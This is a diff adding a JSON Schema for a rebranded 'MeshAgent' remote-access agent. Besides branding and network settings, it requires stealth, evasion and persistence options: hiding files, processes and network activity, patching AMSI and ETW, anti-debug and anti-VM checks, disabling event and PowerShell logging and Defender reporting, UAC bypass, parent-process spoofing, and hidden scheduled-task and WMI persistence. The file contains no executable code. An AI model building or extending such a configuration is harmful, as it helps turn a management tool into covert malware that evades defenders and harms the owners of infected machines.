@@ -1,0 +1,597 @@
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "title": "MeshAgent Branding Configuration",
+  "type": "object",
+  "additionalProperties": false,
+  "required": [
+    "branding",
+    "network",
+    "artifacts",
+    "stealth",
+    "persistence",
+    "evasion",
+    "security",
+    "provisioning",
+    "advanced"
+  ],
+  "properties": {
+    "$schema": {
+      "type": "string"
+    },
+    "_comment": {
+      "type": "string"
+    },
+    "branding": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "companyName",
+        "serviceName",
+        "displayName",
+        "binaryName",
+        "productName",
+        "description",
+        "installRoot",
+        "logPath",
+        "versionInfo"
+      ],
+      "properties": {
+        "companyName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "serviceName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "displayName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "binaryName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "productName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "description": {
+          "type": "string",
+          "minLength": 1
+        },
+        "installRoot": {
+          "type": "string",
+          "minLength": 1
+        },
+        "logPath": {
+          "type": "string",
+          "minLength": 1
+        },
+        "versionInfo": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": [
+            "fileVersion",
+            "productVersion",
+            "fileDescription",
+            "internalName",
+            "legalCopyright",
+            "originalFilename"
+          ],
+          "properties": {
+            "fileVersion": {
+              "type": "string",
+              "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+$"
+            },
+            "productVersion": {
+              "type": "string",
+              "pattern": "^\\d+\\.\\d+\\.\\d+\\.\\d+$"
+            },
+            "fileDescription": {
+              "type": "string",
+              "minLength": 1
+            },
+            "internalName": {
+              "type": "string",
+              "minLength": 1
+            },
+            "legalCopyright": {
+              "type": "string",
+              "minLength": 1
+            },
+            "originalFilename": {
+              "type": "string",
+              "minLength": 1
+            }
+          }
+        }
+      }
+    },
+    "network": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "primaryEndpoint",
+        "userAgent",
+        "alpn",
+        "retryAttempts",
+        "retryDelay",
+        "connectionTimeout",
+        "keepAlive",
+        "compression"
+      ],
+      "properties": {
+        "primaryEndpoint": {
+          "type": "string",
+          "minLength": 1
+        },
+        "sni": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "hostHeader": {
+          "type": [
+            "string",
+            "null"
+          ]
+        },
+        "alpn": {
+          "type": "array",
+          "items": {
+            "type": "string",
+            "minLength": 1
+          }
+        },
+        "userAgent": {
+          "type": "string",
+          "minLength": 1
+        },
+        "connectionTimeout": {
+          "type": "integer",
+          "minimum": 0
+        },
+        "retryAttempts": {
+          "type": "integer",
+          "minimum": 0
+        },
+        "retryDelay": {
+          "type": "integer",
+          "minimum": 0
+        },
+        "keepAlive": {
+          "type": "boolean"
+        },
+        "compression": {
+          "type": "boolean"
+        }
+      }
+    },
+    "artifacts": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "databaseName",
+        "logFileName",
+        "configFileName"
+      ],
+      "properties": {
+        "databaseName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "logFileName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "configFileName": {
+          "type": "string",
+          "minLength": 1
+        }
+      }
+    },
+    "stealth": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "enabled",
+        "svchostMode",
+        "svchostGroup",
+        "bundleExtract",
+        "hideFiles",
+        "hideRegistry",
+        "hideProcess",
+        "hideNetwork",
+        "amsiPatch",
+        "ettwPatch",
+        "antiDebug",
+        "antiVM",
+        "syscallsDirectMode",
+        "reflectiveLoading",
+        "obfuscateStrings",
+        "encryptMemory",
+        "disableLogging",
+        "selfDelete"
+      ],
+      "properties": {
+        "enabled": {
+          "type": "boolean"
+        },
+        "svchostMode": {
+          "type": "boolean"
+        },
+        "svchostGroup": {
+          "type": "string",
+          "minLength": 1
+        },
+        "bundleExtract": {
+          "type": "boolean"
+        },
+        "hideFiles": {
+          "type": "boolean"
+        },
+        "hideRegistry": {
+          "type": "boolean"
+        },
+        "hideProcess": {
+          "type": "boolean"
+        },
+        "hideNetwork": {
+          "type": "boolean"
+        },
+        "amsiPatch": {
+          "type": "boolean"
+        },
+        "ettwPatch": {
+          "type": "boolean"
+        },
+        "antiDebug": {
+          "type": "boolean"
+        },
+        "antiVM": {
+          "type": "boolean"
+        },
+        "syscallsDirectMode": {
+          "type": "boolean"
+        },
+        "reflectiveLoading": {
+          "type": "boolean"
+        },
+        "obfuscateStrings": {
+          "type": "boolean"
+        },
+        "encryptMemory": {
+          "type": "boolean"
+        },
+        "disableLogging": {
+          "type": "boolean"
+        },
+        "selfDelete": {
+          "type": "boolean"
+        }
+      }
+    },
+    "persistence": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "runKey",
+        "scheduledTask",
+        "wmi",
+        "watchdog",
+        "serviceRecovery"
+      ],
+      "properties": {
+        "runKey": {
+          "type": "boolean"
+        },
+        "scheduledTask": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": [
+            "enabled",
+            "taskName",
+            "trigger",
+            "hidden"
+          ],
+          "properties": {
+            "enabled": {
+              "type": "boolean"
+            },
+            "taskName": {
+              "type": "string",
+              "minLength": 1
+            },
+            "trigger": {
+              "type": "string",
+              "minLength": 1
+            },
+            "hidden": {
+              "type": "boolean"
+            }
+          }
+        },
+        "wmi": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": [
+            "enabled",
+            "className",
+            "methodName",
+            "namespace"
+          ],
+          "properties": {
+            "enabled": {
+              "type": "boolean"
+            },
+            "className": {
+              "type": "string",
+              "minLength": 1
+            },
+            "methodName": {
+              "type": "string",
+              "minLength": 1
+            },
+            "namespace": {
+              "type": "string",
+              "minLength": 1
+            }
+          }
+        },
+        "watchdog": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": [
+            "enabled",
+            "intervalSeconds",
+            "restartOnCrash",
+            "restartDelay"
+          ],
+          "properties": {
+            "enabled": {
+              "type": "boolean"
+            },
+            "intervalSeconds": {
+              "type": "integer",
+              "minimum": 0
+            },
+            "restartOnCrash": {
+              "type": "boolean"
+            },
+            "restartDelay": {
+              "type": "integer",
+              "minimum": 0
+            }
+          }
+        },
+        "serviceRecovery": {
+          "type": "object",
+          "additionalProperties": false,
+          "required": [
+            "enabled",
+            "resetPeriod",
+            "restartDelay",
+            "actions"
+          ],
+          "properties": {
+            "enabled": {
+              "type": "boolean"
+            },
+            "resetPeriod": {
+              "type": "integer",
+              "minimum": 0
+            },
+            "restartDelay": {
+              "type": "integer",
+              "minimum": 0
+            },
+            "actions": {
+              "type": "array",
+              "items": {
+                "type": "string",
+                "minLength": 1
+              }
+            }
+          }
+        }
+      }
+    },
+    "evasion": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "disablePowerShellLogging",
+        "disableEventLogs",
+        "disableWindowsDefenderReporting",
+        "clearPrefetch",
+        "disableETW",
+        "patchAMSI",
+        "bypassUAC",
+        "hideFromTaskManager",
+        "spoofParentProcess",
+        "useSyscalls"
+      ],
+      "properties": {
+        "disablePowerShellLogging": {
+          "type": "boolean"
+        },
+        "disableEventLogs": {
+          "type": "boolean"
+        },
+        "disableWindowsDefenderReporting": {
+          "type": "boolean"
+        },
+        "clearPrefetch": {
+          "type": "boolean"
+        },
+        "disableETW": {
+          "type": "boolean"
+        },
+        "patchAMSI": {
+          "type": "boolean"
+        },
+        "bypassUAC": {
+          "type": "boolean"
+        },
+        "hideFromTaskManager": {
+          "type": "boolean"
+        },
+        "spoofParentProcess": {
+          "type": "boolean"
+        },
+        "useSyscalls": {
+          "type": "boolean"
+        }
+      }
+    },
+    "security": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "certificatePinning",
+        "encryptedCommunication",
+        "mutualTLS",
+        "validateServerCert",
+        "serverCertHash"
+      ],
+      "properties": {
+        "certificatePinning": {
+          "type": "boolean"
+        },
+        "encryptedCommunication": {
+          "type": "boolean"
+        },
+        "mutualTLS": {
+          "type": "boolean"
+        },
+        "validateServerCert": {
+          "type": "boolean"
+        },
+        "serverCertHash": {
+          "type": "string",
+          "pattern": "^[A-Fa-f0-9]{64}$"
+        },
+        "allowedSigners": {
+          "type": "array",
+          "minItems": 1,
+          "items": {
+            "type": "object",
+            "additionalProperties": false,
+            "required": [
+              "thumbprint"
+            ],
+            "properties": {
+              "thumbprint": {
+                "type": "string",
+                "pattern": "^[A-Fa-f0-9]{40}$"
+              },
+              "subject": {
+                "type": "string"
+              },
+              "store": {
+                "type": "string",
+                "minLength": 1
+              },
+              "description": {
+                "type": "string"
+              },
+              "path": {
+                "type": "string"
+              }
+            }
+          }
+        }
+      }
+    },
+    "provisioning": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "meshName",
+        "meshType",
+        "meshId",
+        "serverId",
+        "serverUrl",
+        "autoRegister",
+        "installFlags"
+      ],
+      "properties": {
+        "meshName": {
+          "type": "string",
+          "minLength": 1
+        },
+        "meshType": {
+          "type": [
+            "string",
+            "integer"
+          ]
+        },
+        "meshId": {
+          "type": "string",
+          "minLength": 1
+        },
+        "serverId": {
+          "type": "string",
+          "pattern": "^[A-Fa-f0-9]{64}$"
+        },
+        "serverUrl": {
+          "type": "string",
+          "minLength": 1
+        },
+        "autoRegister": {
+          "type": "boolean"
+        },
+        "installFlags": {
+          "type": "string"
+        }
+      }
+    },
+    "advanced": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "coreDumpEnabled",
+        "agentLogDump",
+        "debugMode",
+        "verboseLogging",
+        "agentPing",
+        "agentPong",
+        "agentIdleTimeout",
+        "compressionLevel"
+      ],
+      "properties": {
+        "coreDumpEnabled": {
+          "type": "boolean"
+        },
+        "agentLogDump": {
+          "type": "boolean"
+        },
+        "debugMode": {
+          "type": "boolean"
+        },
+        "verboseLogging": {
+          "type": "boolean"
+        },
+        "agentPing": {
+          "type": "integer",
+          "minimum": 0
+        },
+        "agentPong": {
+          "type": "integer",
+          "minimum": 0
+        },
+        "agentIdleTimeout": {
+          "type": "integer",
+          "minimum": 0
+        },
+        "compressionLevel": {
+          "type": "integer",
+          "minimum": 0,
+          "maximum": 9
+        }
+      }
+    }
+  }
+}
